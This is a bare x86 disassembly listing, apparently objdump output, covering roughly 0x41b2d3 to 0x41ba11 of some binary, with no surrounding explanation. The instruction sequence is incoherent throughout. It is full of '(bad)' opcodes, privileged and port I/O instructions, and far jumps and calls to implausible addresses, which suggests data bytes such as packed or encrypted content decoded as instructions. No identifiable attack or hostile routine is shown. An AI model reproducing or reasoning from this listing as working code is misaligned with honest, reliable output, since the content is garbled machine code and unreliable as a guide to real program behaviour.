  41b2d3:	and    al,BYTE PTR [edx+0x3c]
  41b2d6:	in     eax,0x5b
  41b2d8:	enter  0xa1f5,0xee
  41b2dc:	mov    edi,0x4e6533f6
  41b2e1:	shr    DWORD PTR [ebx-0x61],cl
  41b2e4:	xlat   BYTE PTR ds:[ebx]
  41b2e5:	sub    BYTE PTR [ebp+ebp*1-0x34],bh
  41b2e9:	div    DWORD PTR ds:0xa87f94fd
  41b2ef:	repz (bad) 
  41b2f1:	push   ds
  41b2f2:	inc    ebp
  41b2f3:	enter  0x648c,0x99
  41b2f7:	inc    esi
  41b2f8:	xchg   edx,eax
  41b2f9:	jg     0x41b312
  41b2fb:	mov    bl,0xe2
  41b2fd:	fidivr DWORD PTR [ebp+0xc94e7fd]
  41b303:	es xchg esp,eax
  41b305:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b306:	mov    eax,ds:0x76f02d74
  41b30b:	inc    eax
  41b30c:	popf   
  41b30d:	sbb    al,0x3f
  41b30f:	jecxz  0x41b371
  41b311:	add    al,0x69
  41b313:	mov    eax,0x797e12d3
  41b318:	in     al,0x8c
  41b31a:	inc    esp
  41b31b:	pop    ebx
  41b31c:	add    ch,BYTE PTR [esi]
  41b31e:	fild   QWORD PTR [esi+edi*2+0x24]
  41b322:	inc    ecx
  41b323:	jns    0x41b332
  41b325:	sbb    al,0x63
  41b327:	ret    
  41b328:	les    ebp,FWORD PTR [eax-0x6f]
  41b32b:	push   eax
  41b32c:	sub    ah,ah
  41b32e:	or     dl,BYTE PTR [esi+0x8]
  41b331:	clc    
  41b332:	ja     0x41b301
  41b334:	ins    DWORD PTR es:[edi],dx
  41b335:	hlt    
  41b336:	inc    eax
  41b337:	dec    edx
  41b338:	sub    eax,DWORD PTR ds:0xda4617f4
  41b33e:	jae    0x41b2e9
  41b340:	inc    esi
  41b341:	pop    ecx
  41b342:	cmp    DWORD PTR [edx+edx*2-0xdb0d31d],0x3a
  41b34a:	sub    eax,0x4817473e
  41b34f:	mov    ss,ebp
  41b351:	sysexit 
  41b353:	push   ebx
  41b354:	mov    ds:0x965ef654,al
  41b359:	mov    ch,0x92
  41b35b:	sbb    eax,0x19efb5d8
  41b360:	push   cs
  41b361:	and    esp,edx
  41b363:	pop    ecx
  41b364:	aam    0xca
  41b366:	mov    bl,0xa
  41b368:	mov    eax,0x7af17320
  41b36d:	pop    eax
  41b36e:	cwde   
  41b36f:	cmp    BYTE PTR fs:[edi+0x670ce5c],cl
  41b376:	push   0xffffffd7
  41b378:	push   ds
  41b379:	pop    edi
  41b37a:	jbe    0x41b364
  41b37c:	stc    
  41b37d:	or     al,0xa6
  41b37f:	mov    ds:0xf41707c9,al
  41b384:	xchg   ecx,eax
  41b385:	sbb    eax,ebp
  41b387:	mov    ds:0xf0437c9a,al
  41b38c:	loope  0x41b344
  41b38e:	sbb    edx,DWORD PTR [ebx]
  41b390:	pcmpgtb mm1,QWORD PTR [ebx]
  41b393:	push   ecx
  41b394:	fimul  WORD PTR ds:0xf624a564
  41b39a:	inc    edx
  41b39b:	or     BYTE PTR ds:0x451d27a5,bh
  41b3a1:	test   BYTE PTR [esp+ebx*2+0x5ad35db8],ah
  41b3a8:	pop    ss
  41b3a9:	and    eax,esp
  41b3ab:	xchg   ecx,eax
  41b3ac:	jp     0x41b3d0
  41b3ae:	je     0x41b36c
  41b3b0:	loopne 0x41b381
  41b3b2:	aam    0x54
  41b3b4:	jno    0x41b3c6
  41b3b6:	pop    es
  41b3b7:	adc    ebp,edx
  41b3b9:	jae    0x41b3d0
  41b3bb:	(bad)  
  41b3bc:	in     eax,dx
  41b3bd:	std    
  41b3be:	cmp    BYTE PTR [eax],ah
  41b3c0:	repnz sbb BYTE PTR [esi+0xedb0799],dh
  41b3c7:	xchg   ecx,eax
  41b3c8:	stc    
  41b3c9:	fimul  DWORD PTR [eax]
  41b3cb:	pop    ebp
  41b3cc:	test   BYTE PTR [edi+0x5b],bh
  41b3cf:	test   eax,0xd8c91168
  41b3d4:	push   edi
  41b3d5:	sbb    esp,DWORD PTR ds:0x1717a12
  41b3db:	pushf  
  41b3dc:	imul   BYTE PTR [ebx-0x5c5369db]
  41b3e2:	ret    
  41b3e3:	jp     0x41b426
  41b3e5:	xchg   edi,eax
  41b3e6:	lea    esp,[edx]
  41b3e8:	popa   
  41b3e9:	int3   
  41b3ea:	and    BYTE PTR [ebp-0x6d997ec0],cl
  41b3f0:	pop    ds
  41b3f1:	dec    edi
  41b3f2:	or     ebx,0x6e
  41b3f5:	in     eax,dx
  41b3f6:	mov    bl,0xe
  41b3f8:	call   0x475f:0xea983be
  41b3ff:	iret   
  41b400:	pop    ebp
  41b401:	fsub   QWORD PTR [eax-0x4e]
  41b404:	aaa    
  41b405:	push   eax
  41b406:	fstp   TBYTE PTR [edx]
  41b408:	xor    dl,BYTE PTR [esi+ecx*2]
  41b40b:	mov    BYTE PTR [ebp+eiz*4-0x70],bh
  41b40f:	add    DWORD PTR [ecx],eax
  41b411:	into   
  41b412:	dec    ebx
  41b413:	cs push es
  41b415:	mov    al,ds:0x5709ac62
  41b41a:	scas   eax,DWORD PTR es:[edi]
  41b41b:	fs cmp al,0xe1
  41b41e:	xchg   ebp,eax
  41b41f:	mov    esi,DWORD PTR [ecx]
  41b421:	call   0x28dfabfe
  41b426:	into   
  41b427:	push   ecx
  41b428:	jmp    0x71b4:0xb3d71d0
  41b42f:	pop    esp
  41b430:	loope  0x41b44f
  41b432:	push   edi
  41b433:	adc    eax,0xfef69e75
  41b438:	lock jle 0x41b3f4
  41b43b:	pop    edx
  41b43c:	pop    edi
  41b43d:	lds    edx,FWORD PTR [edx+0x72]
  41b440:	mov    esp,0xaedfda3b
  41b445:	xor    bh,BYTE PTR [ecx-0x6ade095c]
  41b44b:	xchg   ch,ch
  41b44d:	push   ecx
  41b44e:	cmp    edi,DWORD PTR [ebp+0x4bdd0f3d]
  41b454:	in     eax,0xa5
  41b456:	je     0x41b4a1
  41b458:	jmp    0x41b43b
  41b45a:	(bad)  
  41b45b:	scas   eax,DWORD PTR es:[edi]
  41b45c:	jno    0x41b48b
  41b45e:	cmp    bl,ch
  41b460:	dec    edi
  41b461:	ss xor eax,0x49c42bf0
  41b467:	ins    BYTE PTR es:[edi],dx
  41b468:	and    eax,0x5f7f268e
  41b46d:	xor    ah,BYTE PTR [eax-0x213f22ec]
  41b473:	push   0x1d
  41b475:	popa   
  41b476:	lods   eax,DWORD PTR ds:[esi]
  41b477:	jp     0x41b4e1
  41b479:	(bad)  [ebp+esi*1+0x30]
  41b47d:	ror    DWORD PTR [edi+eiz*8],cl
  41b480:	stos   BYTE PTR es:[edi],al
  41b481:	test   al,0x5d
  41b483:	fadd   st(5),st
  41b485:	pop    eax
  41b486:	add    eax,ecx
  41b488:	lahf   
  41b489:	(bad)  
  41b48a:	sar    DWORD PTR [edi-0x284223f5],cl
  41b490:	and    DWORD PTR [esi-0x5dadccc],0x42
  41b497:	sbb    dh,BYTE PTR [ebp-0x27451a15]
  41b49d:	add    BYTE PTR [edi],bh
  41b49f:	pop    eax
  41b4a0:	mov    ebx,0xad9a10f6
  41b4a5:	daa    
  41b4a6:	leave  
  41b4a7:	and    BYTE PTR [esi-0x6da7515a],cl
  41b4ad:	mov    esp,0x15d46d26
  41b4b2:	xchg   dl,al
  41b4b4:	jecxz  0x41b4ff
  41b4b6:	add    ch,dl
  41b4b8:	fcmovnbe st,st(2)
  41b4ba:	fcomp  st(4)
  41b4bc:	mov    ah,BYTE PTR [edx]
  41b4be:	aas    
  41b4bf:	lods   eax,DWORD PTR ds:[esi]
  41b4c0:	ficom  DWORD PTR [ecx-0x51]
  41b4c3:	ins    BYTE PTR es:[edi],dx
  41b4c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b4c5:	inc    esp
  41b4c6:	mov    al,ds:0x9cb5a4db
  41b4cb:	shr    BYTE PTR [edi],cl
  41b4cd:	and    eax,0x44d1e58a
  41b4d2:	ins    BYTE PTR es:[edi],dx
  41b4d3:	mov    eax,ds:0x35f30385
  41b4d8:	stos   DWORD PTR es:[edi],eax
  41b4d9:	leave  
  41b4da:	cmp    DWORD PTR [esi-0x34ae9e7a],ebp
  41b4e0:	cmp    BYTE PTR [ebp+0x70f60d72],0xf5
  41b4e7:	or     BYTE PTR [eax],dl
  41b4e9:	push   edi
  41b4ea:	sub    al,0x1d
  41b4ec:	fist   DWORD PTR [esi]
  41b4ee:	inc    eax
  41b4ef:	push   ds
  41b4f0:	cld    
  41b4f1:	sbb    DWORD PTR [ecx+0x61d37ca1],eax
  41b4f7:	enter  0xbaf9,0xa8
  41b4fb:	push   esi
  41b4fc:	fistp  QWORD PTR [edx-0x46]
  41b4ff:	jge    0x41b52e
  41b501:	sbb    al,0xd5
  41b503:	(bad)  
  41b504:	xchg   esi,eax
  41b505:	test   al,0x76
  41b507:	dec    edi
  41b508:	mov    ecx,DWORD PTR [esi-0x5e702a54]
  41b50e:	fidivr DWORD PTR [eax+0x3eea3434]
  41b514:	dec    esi
  41b515:	fdiv   QWORD PTR [ebp-0x30]
  41b518:	lahf   
  41b519:	xchg   edx,eax
  41b51a:	out    dx,eax
  41b51b:	jmp    0xfab29e77
  41b520:	push   esi
  41b521:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b522:	mov    bl,BYTE PTR [eax+0xcb3f91b]
  41b528:	ret    0xdd
  41b52b:	pop    ss
  41b52c:	sbb    al,0xaa
  41b52e:	adc    ebp,DWORD PTR [ebx-0x3567c17f]
  41b534:	push   0xf08a3af0
  41b539:	xor    DWORD PTR ds:0x81ea6ff6,edi
  41b53f:	adc    BYTE PTR [esi],al
  41b541:	jecxz  0x41b588
  41b543:	push   ds
  41b544:	dec    edx
  41b545:	jbe    0x41b530
  41b547:	dec    esi
  41b548:	(bad)  
  41b549:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b54a:	(bad)  
  41b54b:	push   di
  41b54d:	add    eax,0x11bc3be3
  41b552:	and    al,BYTE PTR [edx+0x4490bf0b]
  41b558:	retf   
  41b559:	icebp  
  41b55a:	mov    BYTE PTR [ebp-0x7769d8f0],bh
  41b560:	mov    bh,0x69
  41b562:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b563:	add    BYTE PTR ds:0x1a8dd039,dl
  41b569:	fucom  st(4)
  41b56b:	sub    eax,0xce89cf8f
  41b570:	pop    ecx
  41b571:	ins    BYTE PTR es:[edi],dx
  41b572:	es out 0x46,al
  41b575:	mov    eax,ds:0x9429b106
  41b57a:	loopne 0x41b56d
  41b57c:	mov    ch,0x7a
  41b57e:	push   ecx
  41b57f:	adc    BYTE PTR [ebx*4+0x2420c05f],0x3e
  41b587:	ins    BYTE PTR es:[edi],dx
  41b588:	lods   eax,DWORD PTR ds:[esi]
  41b589:	push   eax
  41b58a:	jge    0x41b56b
  41b58c:	cld    
  41b58d:	stc    
  41b58e:	mov    ecx,0x5350cf68
  41b593:	repnz and eax,DWORD PTR [eax-0x5812f7f6]
  41b59a:	mov    bh,0xda
  41b59c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b59d:	jg     0x41b521
  41b59f:	and    DWORD PTR [ebx+0x71],edx
  41b5a2:	cmc    
  41b5a3:	jecxz  0x41b608
  41b5a5:	jns    0x41b619
  41b5a7:	mov    dh,0x37
  41b5a9:	sub    edx,DWORD PTR [ecx-0x1ce45097]
  41b5af:	neg    BYTE PTR ds:0x2fcf0e59
  41b5b5:	ins    BYTE PTR es:[edi],dx
  41b5b6:	shl    BYTE PTR [esi],0xff
  41b5b9:	and    esi,DWORD PTR [ebx+0x32]
  41b5bc:	test   eax,0x8e8cc631
  41b5c1:	sub    bh,BYTE PTR [edx+0x40d801]
  41b5c7:	adc    al,0xc9
  41b5c9:	jmp    0xffdc18bf
  41b5ce:	leave  
  41b5cf:	fcmovb st,st(0)
  41b5d1:	mov    edx,0xa8c6ba86
  41b5d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b5d7:	out    dx,al
  41b5d8:	dec    edx
  41b5d9:	mov    ds:0xec0c6259,eax
  41b5de:	(bad)
  41b5e2:	mov    DWORD PTR [eax+0x4403f99b],ecx
  41b5e8:	scas   eax,DWORD PTR es:[edi]
  41b5e9:	push   cs
  41b5ea:	loopne 0x41b654
  41b5ec:	xchg   ebx,eax
  41b5ed:	lea    eax,[ecx-0x75544f17]
  41b5f3:	in     eax,dx
  41b5f4:	jl     0x41b61a
  41b5f6:	in     al,dx
  41b5f7:	test   DWORD PTR [ecx+0x74],edx
  41b5fa:	xor    dh,BYTE PTR [ecx-0x1f75668f]
  41b600:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b601:	cmp    DWORD PTR [edi+0x6c],ebx
  41b604:	inc    ecx
  41b605:	cdq    
  41b606:	lods   al,BYTE PTR ds:[esi]
  41b607:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b608:	cld    
  41b609:	ins    DWORD PTR es:[edi],dx
  41b60a:	test   BYTE PTR [edx+0x43b659e5],bh
  41b610:	dec    esp
  41b611:	int3   
  41b612:	fidivr WORD PTR [ebx+ebp*2+0x3bd891b1]
  41b619:	pop    ebx
  41b61a:	or     BYTE PTR [esi],bh
  41b61c:	sub    ah,BYTE PTR [ebx+0x6e]
  41b61f:	xchg   DWORD PTR [ebx-0x2d],ebx
  41b622:	pusha  
  41b623:	inc    eax
  41b624:	daa    
  41b625:	ret    
  41b626:	mov    bl,0xe9
  41b628:	xor    cl,dh
  41b62a:	fwait
  41b62b:	add    eax,DWORD PTR [eax+0x6cd5a5d]
  41b631:	fcomp  DWORD PTR [esi-0x6007f985]
  41b637:	cmp    al,0x5a
  41b639:	jne    0x41b6a7
  41b63b:	mov    ds,esp
  41b63d:	push   edx
  41b63e:	aam    0x4a
  41b640:	add    DWORD PTR [edx-0x73],0xc50010a6
  41b647:	mov    edi,0xbf08f958
  41b64c:	sub    ebx,ebp
  41b64e:	jmp    0xad691b04
  41b653:	and    DWORD PTR [edx],0xffffffeb
  41b656:	mov    ds:0x23aed46f,al
  41b65b:	xchg   ebx,eax
  41b65c:	cmp    ebp,esi
  41b65e:	mov    bh,0x87
  41b660:	inc    ebx
  41b661:	add    DWORD PTR [edx+ebx*2-0x681811e1],ebx
  41b668:	mov    bl,0x3e
  41b66a:	cmc    
  41b66b:	shr    BYTE PTR [ebx],1
  41b66d:	shl    BYTE PTR [ebp-0x1e],cl
  41b670:	loop   0x41b645
  41b672:	inc    esi
  41b673:	cmp    BYTE PTR [ebp-0x76],bh
  41b676:	rcl    edx,0x85
  41b679:	clc    
  41b67a:	hlt    
  41b67b:	jge    0x41b683
  41b67d:	pushw  ss
  41b67f:	jg     0x41b6b3
  41b681:	adc    eax,0x69c966ca
  41b686:	push   es
  41b687:	add    DWORD PTR [edi],edx
  41b689:	cs repnz dec ecx
  41b68c:	sbb    eax,0x4a8fea52
  41b691:	pop    ebx
  41b692:	jnp    0x41b615
  41b694:	repz xchg ebx,eax
  41b696:	pop    eax
  41b697:	mov    bh,0x61
  41b699:	push   eax
  41b69a:	rcr    bl,1
  41b69c:	and    cl,BYTE PTR cs:[ecx+esi*1-0x46b57f32]
  41b6a4:	pop    esp
  41b6a5:	loope  0x41b657
  41b6a7:	inc    ebx
  41b6a8:	sub    al,BYTE PTR [edx+0x39]
  41b6ab:	cmp    al,0x89
  41b6ad:	fisub  DWORD PTR [edi]
  41b6af:	adc    cl,bh
  41b6b1:	(bad)  [edi]
  41b6b3:	pop    eax
  41b6b4:	sub    esp,DWORD PTR ds:0xab210381
  41b6ba:	push   eax
  41b6bb:	sbb    al,0xb5
  41b6bd:	or     al,0xe1
  41b6bf:	xor    esp,edx
  41b6c1:	adc    DWORD PTR [edi-0x5587d0ed],ebx
  41b6c7:	adc    al,0x62
  41b6c9:	fadd   QWORD PTR [esi]
  41b6cb:	pop    ecx
  41b6cc:	jmp    0x4511:0xcd1531ae
  41b6d3:	fstp   TBYTE PTR [ebp-0x2ade3ac3]
  41b6d9:	adc    eax,0x8debecd6
  41b6de:	mov    dh,0x2d
  41b6e0:	jne    0x41b730
  41b6e2:	fmul   QWORD PTR [esp+edi*8-0x7dd33203]
  41b6e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b6ea:	and    BYTE PTR [esi-0x72],ah
  41b6ed:	fcom   QWORD PTR [eax+ebp*2+0x51]
  41b6f1:	sbb    ebx,DWORD PTR [edx]
  41b6f3:	lods   al,BYTE PTR ds:[esi]
  41b6f4:	mov    dl,0xbb
  41b6f6:	sub    DWORD PTR [ecx-0x1e],edi
  41b6f9:	(bad)  
  41b6fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b6fb:	icebp  
  41b6fc:	mov    bh,0x3d
  41b6fe:	std    
  41b6ff:	ror    BYTE PTR [eax],1
  41b701:	neg    BYTE PTR [edx+0x33]
  41b704:	(bad)  
  41b705:	in     eax,dx
  41b706:	push   ecx
  41b707:	sub    eax,0xa5174fb8
  41b70c:	mov    ebp,0xfcb4b04c
  41b711:	(bad)  
  41b712:	adc    dh,BYTE PTR [ebx-0xc]
  41b715:	repz mov edi,0x63ac902a
  41b71b:	cld    
  41b71c:	dec    esi
  41b71d:	(bad)  
  41b71e:	mov    dh,0xbc
  41b720:	rol    BYTE PTR [ecx+0x3508bb64],1
  41b726:	or     eax,0x5f843b20
  41b72b:	(bad)  
  41b72c:	(bad)  
  41b72e:	popf   
  41b72f:	pop    edi
  41b730:	dec    eax
  41b731:	fistp  QWORD PTR [edi+0x38]
  41b734:	sub    cl,ch
  41b736:	and    al,0xd5
  41b738:	push   ecx
  41b739:	mov    eax,0xe53e1894
  41b73e:	and    al,0x46
  41b740:	jb     0x41b7a8
  41b742:	mov    cl,0x8d
  41b744:	add    DWORD PTR [esi+0x68],edx
  41b747:	add    eax,0x959b7799
  41b74c:	pop    eax
  41b74d:	push   cs
  41b74e:	(bad)  
  41b74f:	ss jp  0x41b7a7
  41b752:	scas   al,BYTE PTR es:[edi]
  41b753:	fs stos DWORD PTR es:[edi],eax
  41b755:	lahf   
  41b756:	fld    TBYTE PTR [esi]
  41b758:	jmp    0x41b74c
  41b75a:	push   0xe8b6928c
  41b75f:	in     eax,0x4d
  41b761:	fsub   st,st(4)
  41b763:	push   ss
  41b764:	xchg   edx,eax
  41b765:	shl    DWORD PTR [ebx-0x7],cl
  41b768:	popf   
  41b769:	dec    edi
  41b76a:	or     eax,eax
  41b76c:	push   ds
  41b76d:	and    ah,ch
  41b76f:	dec    edi
  41b770:	loope  0x41b7f0
  41b772:	adc    DWORD PTR [esi+0x7b582c27],ebp
  41b778:	xchg   ebx,eax
  41b779:	sbb    ch,bl
  41b77b:	push   edi
  41b77c:	jno    0x41b7cb
  41b77e:	mov    esi,0xcb20636a
  41b783:	ja     0x41b77e
  41b785:	fiadd  WORD PTR [ebx-0x5282fbbb]
  41b78b:	and    BYTE PTR [eax+0x4e66fffe],cl
  41b791:	xlat   BYTE PTR ds:[ebx]
  41b792:	dec    ebp
  41b793:	mov    al,ds:0x855342bf
  41b798:	into   
  41b799:	aas    
  41b79a:	aas    
  41b79b:	rol    edi,cl
  41b79d:	sub    eax,0x7bf1ddf8
  41b7a2:	pusha  
  41b7a3:	sub    eax,0x7339c356
  41b7a8:	inc    eax
  41b7a9:	add    al,0x8b
  41b7ab:	adc    dl,BYTE PTR [ebx+0x682670fd]
  41b7b1:	mov    esp,ecx
  41b7b3:	aam    0xf6
  41b7b5:	sbb    bh,ah
  41b7b7:	cmc    
  41b7b8:	dec    ecx
  41b7b9:	aad    0xc1
  41b7bb:	into   
  41b7bc:	test   BYTE PTR [eax+edx*8],0x79
  41b7c0:	mov    bl,BYTE PTR [edx-0x2548e0b7]
  41b7c6:	cwde   
  41b7c7:	fwait
  41b7c8:	xlat   BYTE PTR ds:[ebx]
  41b7c9:	int    0xca
  41b7cb:	sbb    eax,0x9567e825
  41b7d0:	pop    ebp
  41b7d1:	ret    0x47b5
  41b7d4:	cmp    DWORD PTR [ebp-0x69],0xe57c473c
  41b7db:	sbb    al,0xc7
  41b7dd:	push   eax
  41b7de:	scas   eax,DWORD PTR es:[edi]
  41b7df:	shl    BYTE PTR [eax+0x45],0x37
  41b7e3:	scas   eax,DWORD PTR es:[edi]
  41b7e4:	rol    DWORD PTR [ebx-0x93a770a],cl
  41b7ea:	lock dec edi
  41b7ec:	aam    0x4e
  41b7ee:	lock (bad) 
  41b7f0:	fcmovnb st,st(1)
  41b7f2:	pop    esp
  41b7f3:	push   ecx
  41b7f4:	test   al,0x6e
  41b7f6:	mov    esi,0x108545cb
  41b7fb:	mov    BYTE PTR [ebp-0x12],0x60
  41b7ff:	out    0xd2,al
  41b801:	lock cwde 
  41b803:	pop    es
  41b804:	js     0x41b876
  41b806:	aas    
  41b807:	cli    
  41b808:	ins    DWORD PTR es:[edi],dx
  41b809:	xchg   DWORD PTR [edx],ebx
  41b80b:	or     al,0xa1
  41b80d:	adc    eax,0x7f891184
  41b812:	ret    
  41b813:	js     0x41b795
  41b815:	dec    edx
  41b816:	enter  0xd2bb,0xf1
  41b81a:	jmp    0xa9f5ee34
  41b81f:	lods   eax,DWORD PTR ds:[esi]
  41b820:	dec    esp
  41b821:	jae    0x41b87e
  41b823:	xchg   ecx,eax
  41b824:	sti    
  41b825:	lods   al,BYTE PTR ds:[esi]
  41b826:	scas   eax,DWORD PTR es:[edi]
  41b827:	pushf  
  41b828:	adc    eax,0xf976073c
  41b82d:	inc    edx
  41b82e:	inc    esp
  41b82f:	pop    es
  41b830:	mov    cl,0x64
  41b832:	sbb    edi,DWORD PTR [ebx+0x2e]
  41b835:	xchg   ebp,eax
  41b836:	out    0xbe,al
  41b838:	xlat   BYTE PTR ds:[ebx]
  41b839:	stos   DWORD PTR es:[edi],eax
  41b83a:	jne    0x41b7d2
  41b83c:	push   ss
  41b83d:	xchg   edx,eax
  41b83e:	sbb    DWORD PTR [eax+0x75],esi
  41b841:	xor    DWORD PTR [esi-0x73],eax
  41b844:	imul   edi,edi,0x2a2e7223
  41b84a:	sbb    ch,BYTE PTR [esi]
  41b84c:	xor    eax,0xcfd410e9
  41b851:	mov    ah,0xae
  41b853:	or     eax,esp
  41b855:	pop    esp
  41b856:	push   esp
  41b857:	(bad)  
  41b858:	or     eax,0xc5fee0c3
  41b85d:	(bad)  
  41b85e:	clc    
  41b85f:	fstp   DWORD PTR [esi-0x1c]
  41b862:	pop    edx
  41b863:	push   es
  41b864:	push   edi
  41b865:	outs   dx,DWORD PTR ds:[esi]
  41b866:	adc    eax,0x143e6985
  41b86b:	arpl   cx,ax
  41b86d:	paddb  mm0,mm5
  41b870:	pop    edx
  41b871:	stos   DWORD PTR es:[edi],eax
  41b872:	cmp    cl,BYTE PTR [edx]
  41b874:	sub    dl,bl
  41b876:	xchg   ebx,eax
  41b877:	test   DWORD PTR [esi-0xb],eax
  41b87a:	jl     0x41b7fd
  41b87c:	out    dx,al
  41b87d:	repnz in al,dx
  41b87f:	mov    cl,0xa0
  41b881:	adc    BYTE PTR [esi-0x2da355cb],0x86
  41b888:	je     0x41b84e
  41b88a:	push   es
  41b88b:	aad    0x9f
  41b88d:	test   DWORD PTR [ebx],ebx
  41b88f:	ret    
  41b890:	scas   eax,DWORD PTR es:[edi]
  41b891:	sub    al,0x6d
  41b893:	aas    
  41b894:	(bad)  
  41b895:	or     eax,DWORD PTR [ebp+0x48]
  41b898:	xor    eax,0x9bec0a48
  41b89d:	jmp    0x41b918
  41b89f:	and    al,0x37
  41b8a1:	jae    0x41b884
  41b8a3:	mov    dh,0xb4
  41b8a5:	fdivp  st(4),st
  41b8a7:	pop    es
  41b8a8:	jo     0x41b87c
  41b8aa:	cmovnp ebx,eax
  41b8ad:	mov    ebp,0xeaf382a3
  41b8b2:	and    ebx,DWORD PTR [eax]
  41b8b4:	leave  
  41b8b5:	fidivr DWORD PTR [esi-0x5b1a5e6c]
  41b8bb:	dec    ecx
  41b8bc:	jle    0x41b867
  41b8be:	push   eax
  41b8bf:	mov    dh,0xf1
  41b8c1:	sbb    eax,0xaf4d7ea1
  41b8c6:	test   DWORD PTR [ebx-0x51d5d7b],ecx
  41b8cc:	pop    edi
  41b8cd:	mov    cl,0xc9
  41b8cf:	ins    DWORD PTR es:[edi],dx
  41b8d0:	lea    eax,[edi-0x272409ea]
  41b8d6:	scas   al,BYTE PTR es:[edi]
  41b8d7:	mov    esp,0x99ffebfd
  41b8dc:	dec    edx
  41b8dd:	dec    ecx
  41b8de:	xor    esi,DWORD PTR [edx+0x5a]
  41b8e1:	xor    al,0x47
  41b8e3:	(bad)  
  41b8e4:	push   edx
  41b8e5:	into   
  41b8e6:	(bad)  
  41b8e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b8e8:	pop    edi
  41b8e9:	ret    
  41b8ea:	jg     0x41b917
  41b8ec:	and    BYTE PTR [esi-0x7c1ce06b],bl
  41b8f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b8f3:	dec    eax
  41b8f5:	dec    ecx
  41b8f6:	sub    eax,0xf4cf70fc
  41b8fb:	dec    ebp
  41b8fc:	into   
  41b8fd:	dec    esp
  41b8fe:	xchg   ecx,eax
  41b8ff:	push   0x26
  41b901:	mov    ebp,esi
  41b903:	(bad)  
  41b904:	and    bl,BYTE PTR [ebx-0x38]
  41b907:	daa    
  41b908:	pusha  
  41b909:	xchg   ebp,eax
  41b90a:	out    0xb,eax
  41b90c:	xchg   esi,eax
  41b90d:	js     0x41b969
  41b90f:	and    ebp,edi
  41b911:	pop    esi
  41b912:	mov    edi,0x7cd30f8d
  41b917:	outs   dx,DWORD PTR ds:[esi]
  41b918:	lds    eax,FWORD PTR [esi+0x18]
  41b91b:	mov    edi,0xaa246582
  41b920:	sub    ah,al
  41b922:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b923:	sti    
  41b924:	adc    BYTE PTR [edi-0x1e],dh
  41b927:	fs jo  0x41b8f5
  41b92a:	mov    esi,0x8bab18a6
  41b92f:	jb     0x41b962
  41b931:	shl    DWORD PTR [ebx*1+0x60c0777a],cl
  41b938:	mov    bh,0xb5
  41b93a:	mov    ds:0xb8a3db50,eax
  41b93f:	jecxz  0x41b9b7
  41b941:	call   0x3be59166
  41b946:	add    bh,bl
  41b948:	adc    eax,0x62fe1c89
  41b94d:	js     0x41b974
  41b94f:	xor    DWORD PTR [edx],eax
  41b951:	icebp  
  41b952:	xor    ch,al
  41b954:	jns    0x41b985
  41b956:	(bad)  
  41b957:	(bad)  
  41b958:	lahf   
  41b959:	sbb    eax,0x666d05b3
  41b95e:	bound  esp,QWORD PTR ds:0xd1d1175c
  41b964:	jg     0x41b9e3
  41b966:	inc    edx
  41b967:	les    edx,FWORD PTR [eax]
  41b969:	test   dl,dl
  41b96b:	xchg   edi,eax
  41b96c:	out    0x9b,eax
  41b96e:	fdiv   DWORD PTR [eax]
  41b970:	push   esi
  41b971:	mov    ds:0x9b7d0fb3,al
  41b976:	inc    esi
  41b977:	inc    esi
  41b978:	inc    edi
  41b979:	daa    
  41b97a:	cdq    
  41b97b:	ret    
  41b97c:	ja     0x41b9a1
  41b97e:	jno    0x41b964
  41b980:	sqrtps xmm7,xmm3
  41b983:	cmp    DWORD PTR [ebp-0x4856aeee],ebx
  41b989:	repz push edi
  41b98b:	inc    ebp
  41b98c:	mov    al,ds:0x79f60ebc
  41b991:	es out 0xb1,eax
  41b994:	pop    esi
  41b995:	cwde   
  41b996:	jo     0x41b93a
  41b998:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b999:	cmp    ah,BYTE PTR [edi+edi*1+0x1d]
  41b99d:	in     eax,dx
  41b99e:	push   DWORD PTR [edi]
  41b9a0:	stos   BYTE PTR es:[edi],al
  41b9a1:	ja     0x41ba14
  41b9a3:	mov    cs,WORD PTR [ecx]
  41b9a5:	jl     0x41b96e
  41b9a7:	push   ebx
  41b9a8:	adc    ebx,DWORD PTR ds:0x1951ec70
  41b9ae:	call   0x893d:0x9c4e6a5a
  41b9b5:	fwait
  41b9b6:	sbb    al,0x54
  41b9b8:	lea    ecx,[edx]
  41b9ba:	out    0xd0,eax
  41b9bc:	adc    eax,0x1189b6af
  41b9c1:	mov    eax,0x26f99f2c
  41b9c6:	(bad)  [edi-0x523a85a6]
  41b9cc:	addr16 cmp eax,esp
  41b9cf:	cmp    ecx,eax
  41b9d1:	pusha  
  41b9d2:	mov    eax,ds:0xeb424022
  41b9d7:	adc    esi,DWORD PTR [ecx]
  41b9d9:	fnstsw WORD PTR [edx]
  41b9db:	int3   
  41b9dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b9dd:	mov    bh,0x84
  41b9df:	call   0xf5acdc5d
  41b9e4:	or     al,0xae
  41b9e6:	push   eax
  41b9e7:	push   ebx
  41b9e8:	pop    esp
  41b9e9:	jcxz   0x41b9b2
  41b9ec:	inc    esp
  41b9ed:	cmovbe ebx,DWORD PTR [esi]
  41b9f0:	pop    es
  41b9f1:	dec    ebx
  41b9f2:	adc    BYTE PTR [esi+0x16],bh
  41b9f5:	jno    0x41ba17
  41b9f7:	cs jge 0x41b9ee
  41b9fa:	sub    al,0xe0
  41b9fc:	mov    eax,ds:0xc8d45600
  41ba01:	xchg   ecx,eax
  41ba02:	mov    esp,0xad363825
  41ba07:	sti    
  41ba08:	fcom   DWORD PTR [eax]
  41ba0a:	mov    BYTE PTR [ebp+0x75],ch
  41ba0d:	ja     0x41ba43
  41ba0f:	out    0x7a,eax
  41ba11:	sbb    edx,0xffffff92
